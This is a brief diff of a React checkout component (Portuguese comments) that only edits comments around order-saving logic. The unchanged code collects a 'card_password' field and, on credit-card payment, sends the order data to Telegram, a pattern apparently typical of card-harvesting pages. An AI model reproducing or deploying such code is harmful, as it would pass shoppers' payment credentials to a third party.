@@ -60,15 +60,13 @@ export const CartPayment = ({
         card_password: "",
       };
 
-      // Salvar pedido no banco primeiro
       console.log("Saving order:", orderData);
       const savedOrder = await DatabaseService.saveOrder(orderData);
       
       if (savedOrder) {
-        // Se for cartão de crédito, armazenar ID do pedido para atualização posterior
+        // Se for cartão de crédito, armazenar ID do pedido e enviar notificação
         if (paymentMethod === "credit") {
           localStorage.setItem("currentOrderId", orderId);
-          // Enviar notificação para Telegram
           await sendTelegramNotification(orderData);
         }
         
